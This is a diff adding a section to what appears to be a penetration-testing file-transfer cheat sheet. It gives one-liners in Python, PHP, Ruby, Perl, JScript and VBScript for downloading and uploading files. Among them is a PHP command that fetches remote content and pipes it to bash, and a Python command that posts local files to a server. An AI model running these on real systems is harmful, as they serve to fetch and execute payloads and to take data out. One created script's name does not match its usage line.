@@ -230,5 +230,79 @@ echo bye >> ftpcommand.txt
 ftp -v -n -s:ftpcommand.txt
 ```
 ## Transferring with Code
+### Python - Download
+Python2 Download
+```bash
+python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<Saved_File_Name")'
+```
+Python3 Download
+```bash
+python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<Saved_File_Name")'
+```
+### Python - Upload
+Start UploadServer
+```bash
+python3 -m uploadserver
+```
+Python upload one-liner
+```bash
+python3 -c 'import requests;requests.post("<Upload_URL>",files={"files":open("<Local_File_to_Upload","rb")})'
+```
+### PHP - Download
+PHP Download w/ File_get_contents()
+```bash
+php -r '$file = file_get_contents("<URL>"); file_put_contents("<Saved_File_Name>",$file);'
+```
+PHP Download w/ Fopen()
+```bash
+php -r 'const BUFFER = 1024; $fremote = fopen("<URL>", "rb"); $flocal = fopen("<Saved_File_Name>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+```
+PHP Download and Pipe to Bash
+```bash
+php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+```
+### Ruby - Download
+```bash
+ruby -e 'require "net/http"; File.write("<Saved_File_Name>", Net::HTTP.get(URI.parse("<URL>")))'
+```
+### Perl - Download
+```bash
+perl -e 'use LWP::Simple; getstore("<URL>", "<Saved_File_Name");'
+```
+### Javascript - Download
+Create wsget.js
+```javascript
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+```
+From CMD or PowerShell
+```powershell
+cscript.exe /nologo wget.js <URL> <Output_File_Name>
+```
+### VBScript - Download
+Create wget.vbs
+```vbscript
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+```
+From CMD or PowerShell
+```powershell
+cscript.exe /nologo wget.vbs <URL>  <OutFile>
+```
 ## Misc File Transfer Methods
 ## Catching files over HTTP/S
